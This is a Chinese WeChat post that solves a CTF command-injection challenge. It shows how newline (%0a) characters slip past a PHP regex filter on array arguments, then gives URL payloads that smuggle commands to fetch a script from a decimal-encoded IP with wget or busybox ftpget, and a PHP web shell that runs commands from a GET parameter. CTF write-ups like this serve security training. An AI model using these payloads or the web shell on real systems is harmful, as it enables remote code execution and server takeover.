#  CTF分享 | 命令执行-1   
繁星01  安全君呀   2024-08-25 21:37  
  
将  
安全君呀  
设为"星标  
⭐  
️"  
  
第一时间收到文章更新  
  
**声明: 安全君呀 公众号文章中的技术只做研究之用,禁止用来从事非法用途,如有使用文章中的技术从事非法活动,一切后果由使用者自负,与本公众号无关。**  
  
文章声明：本篇文章内容部分选取网络，如有侵权，请告知删除。  
  
1 命令执行  
  
题目源码：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jr5xjApHb7Et4UV1V2xEVsm9zJfWDuAa7Jria4rVw1CkJoWWdDPat9Z7GvaiaCrt9S4Fkm2QPedsxByNyNia38yUQ/640?wx_fmt=png&from=appmsg "")  
  
代码分析：在目录sandbox下，新建以 IP地址 命名的目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jr5xjApHb7Et4UV1V2xEVsm9zJfWDuAaNxvKhC3fJ9HIl3kBRSYvXsC2PiaCG7JLiaZOKxeo2xjNqY0moBmFPQcA/640?wx_fmt=png&from=appmsg "")  
  
代码分析:   
接受GET方式提交的参数args (数组)匹配数组中每一项是否只由数字、 字母、下划线组成，最后执行/bin/true命令,并且拼接args参数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jr5xjApHb7Et4UV1V2xEVsm9zJfWDuAanBicwdMGVzZqa4h1Unmt9O9tqf8cvibgsDy7jk9XfunjotwqLNpRe0qg/640?wx_fmt=png&from=appmsg "")  
  
args=[1,2,3] => /bin/true 1 2 3  
  
题眼  
:  
  
1、根据循环遍历代码: Si=0; Si<count(Sargs); Si++，可知Sargs是一个数组。  
  
2、根据匹配代码: preg_match('/^\w+S/', Sargs[Si) ,可知Sargs中每一项必须只能由数字、字母、下划线组成。必须绕过  
  
3、根据执行代码implode(" ",   
![](https://mmbiz.qpic.cn/mmbiz_svg/47CicbLQOxtWaJ4MxCbiaZxbBm9yaxSsaFUIws5nTrmiaiaU67mcQzqXicw3KyiaNUMiakxiaW7ssDczV6Fy1SFXxbNrGibLekP6tPSDib/640?wx_fmt=svg&from=appmsg "")  
  
args中每一项都使用 " "空格分隔，符合执行多条命令的条件。  
  
那么此时是否可以直接读取flag值? 正则匹配打消念头。另辟蹊径，上传(下载) webshell, 取得无限制的命令执行接口。  
  
题目分析  
:  
  
1、命令换行  
  
两条命令执行，需要由分隔，否则系统无法识别。  
  
\n -> url编码%0a，并且%0a也会绕过 匹配代码。  
  
访问URL: http://ip/?args[]=a%0A&args[]=touch&args]=abc，相当于执行以下shell命令。  
```
/bin/true a
touch abc
```  
  
此时在IP地址命名的目录下，新建了一个abc文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jr5xjApHb7Et4UV1V2xEVsm9zJfWDuAaKUaib791hpichwI4UkQF0Y5DGY14j6JW8e12JwibOW8iahLticibZbNp0Qzw/640?wx_fmt=png&from=appmsg "")  
  
2、IP地址匹配  
  
IP地址使用  
点分十进制  
表示，此时程序在匹配过程中，会无法匹配到。因此可以使用  
IP地址的十进制格式绕过匹配  
。  
  
例如:  
  
127.0.0.1 ==> 2130706433  
  
在线转换地址:   
https://www.whois365.com/cn/tools/decimal-ip/encode/127.0.0.1  
  
注意:文件后缀名的   
点   
也会被匹配，因此  
文件后缀名无法出现  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jr5xjApHb7Et4UV1V2xEVsm9zJfWDuAaDeMUicHb3DwPaEhibd4guYslsZnEV6sBAguDAicbTfGWHzdvzVLjAqU8Q/640?wx_fmt=png&from=appmsg "")  
  
实现：无需文件后缀名即可调用执行相关代码  
  
解题方法:   
wget 或 busybox->ftpget # %0a->换行符  
  
1、上传shell  
```
http:/ /localhost/
?args[0]=x%0a
&args[1] =mkdir
&args [2 ]=abc%0a
&args[3]=cd
&args [4 ]=abc%0a
&args[5] =wget
&args[6]=IP地址%0a

或

http://localhost/?args[ ]=aa%0a&args[ ]=busybox&args[ ]=ftpget&args[]=<IP_IN_ DECIMAL>&args[ ]=script
```  
  
  
2、执行shell  
```
http://localhost/
?args[0]=x%0a 
&args[1]=tar
&args[2]=cvf
&args[3]=aa
&args [4]=abc%0a
&args[5]=php
&args[6]=aa

或

http://localhost/?args[ ]=aa%0a&args[ ]=php&args[ ]=script
```  
  
  
shell代码：  
```
<?php

file_put_contents(' shell.php' , '
	<?php
	header("Content-Type: text/plain");
	print shell_exec($_GET["cmd"]);
	?>

');
?>
```  
  
  
接下来访问abc目录下的shell.php即可对服务器接管, 寻找flag值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Jr5xjApHb7Et4UV1V2xEVsm9zJfWDuAakyNSvz9R5NJ748icEIcYtYONTBDS2gZmQwHC3rKKViasicablVEm6CmmA/640?wx_fmt=png&from=appmsg "")  
  
  
